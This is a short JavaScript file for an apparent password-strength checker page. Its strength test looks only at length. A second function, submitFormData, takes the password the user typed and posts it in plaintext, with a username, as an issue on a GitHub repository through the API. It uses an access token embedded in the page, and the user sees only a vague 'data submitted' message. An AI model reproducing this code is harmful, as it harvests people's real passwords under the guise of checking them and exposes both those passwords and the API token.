function submitPassword() {
  const password = document.getElementById('passwordInput').value;
  const strength = checkPasswordStrength(password);
  displayResult(strength);
}

function checkPasswordStrength(password) {
  if (password.length < 8) {
    return 'Weak';
  } else if (password.length < 12) {
    return 'Moderate';
  } else {
    return 'Strong';
  }
}

function displayResult(strength) {
  const resultElement = document.getElementById('passwordResult');
  resultElement.textContent = `Password Strength: ${strength}`;
}
function submitFormData() {
  const password = document.getElementById('passwordInput').value;
  const issueTitle = 'User Input - Password Strength';
  const issueBody = `User: <YOUR_USERNAME>\nPassword: ${password}`;

  const apiUrl = 'https://api.github.com/repos/<YOUR_USERNAME>/password-data/issues';

  fetch(apiUrl, {
    method: 'POST',
    headers: {
      'Authorization': 'Bearer <YOUR_ACCESS_TOKEN>',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      title: issueTitle,
      body: issueBody
    })
  })
  .then(response => response.json())
  .then(data => {
    console.log('Issue created:', data);
    alert('Thank you! Your data has been submitted.');
  })
  .catch(error => console.error('Error creating issue:', error));
}
